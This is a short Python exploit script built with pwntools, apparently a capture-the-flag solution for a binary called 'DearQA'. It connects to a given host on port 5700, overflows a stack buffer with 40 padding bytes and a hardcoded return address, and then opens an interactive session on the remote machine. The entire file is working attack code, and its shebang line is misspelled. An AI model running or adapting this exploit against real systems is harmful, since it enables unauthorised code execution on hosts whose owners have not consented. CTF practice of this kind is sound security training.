#!/usr/bin/env pyhon3
from pwn import *
import sys

if len(sys.argv) != 2:
    print("[~] Usage: python3 exploit.py <HOST>")
    sys.exit(1)

host = sys.argv[1]
port = 5700 
context(terminal = ['tmux', 'new-window'])
#make sure you put the correct binary name and path below
binary = context.binary = ELF("./DearQA-1627223337406.DearQA")
context(os = "linux", arch = "amd64")
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"What's your name: ")
log.info("[+] Crafting payload")
payload = b'A' * 40
payload += p64(0x00400686)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()

